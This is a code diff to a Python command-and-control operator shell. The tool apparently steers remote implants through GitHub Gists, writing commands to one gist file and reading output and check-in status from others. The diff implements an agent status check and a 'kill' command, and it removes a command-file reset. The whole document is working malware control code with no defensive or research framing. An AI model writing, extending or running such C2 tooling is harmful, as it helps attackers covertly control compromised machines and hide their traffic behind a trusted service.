@@ -1,11 +1,9 @@
 import json
-import os
 import time
 from modules.lotl_c2 import get_gist_content, update_gist
-from modules.c2_shared import COMMAND_FILENAME, OUTPUT_FILENAME
+from modules.c2_shared import COMMAND_FILENAME, OUTPUT_FILENAME, STATUS_FILENAME
 
 # --- C2 State ---
-active_agents = []
 GIST_ID = None
 GITHUB_TOKEN = None
 
@@ -30,9 +28,9 @@ def print_c2_help():
     """Prints the help menu for the C2 operator shell."""
     print("\n--- C2 Operator Commands ---")
     print("  help                - Show this help menu")
-    print("  agents              - List connected agents (not implemented)")
+    print("  agents              - Check the status of the active agent")
     print("  interact <command>  - Send a command to the active agent")
-    print("  kill <agent_id>     - Terminate an agent connection (not implemented)")
+    print("  kill                - Terminate the active agent")
     print("  back                - Return to the main shell")
     print("  exit                - Exit the framework")
 
@@ -63,7 +61,14 @@ def c2_shell():
             elif command == "help":
                 print_c2_help()
             elif command == "agents":
-                print("Listing active agents is not yet implemented.")
+                print("Checking agent status...")
+                status = get_gist_content(GIST_ID, STATUS_FILENAME)
+                if status:
+                    print(f"\n--- Agent Status ---")
+                    print(f"  Last Check-in: {status}")
+                    print(f"--------------------\n")
+                else:
+                    print("Could not retrieve agent status.")
             elif command == "interact":
                 if not args:
                     print("Usage: interact <command>")
@@ -96,13 +101,15 @@ def c2_shell():
                     if not result or result.strip() == "...":
                         print("Polling timed out. No result received from agent.")
 
-                    # Reset the command file
-                    update_gist(GIST_ID, COMMAND_FILENAME, "waiting...", GITHUB_TOKEN)
                 else:
                     print("Failed to send command.")
 
             elif command == "kill":
-                print("Killing agents is not yet implemented.")
+                print("Sending kill command to agent...")
+                if update_gist(GIST_ID, COMMAND_FILENAME, "kill", GITHUB_TOKEN):
+                    print("Kill command sent successfully.")
+                else:
+                    print("Failed to send kill command.")
             else:
                 print(f"Unknown command: {command}")
 
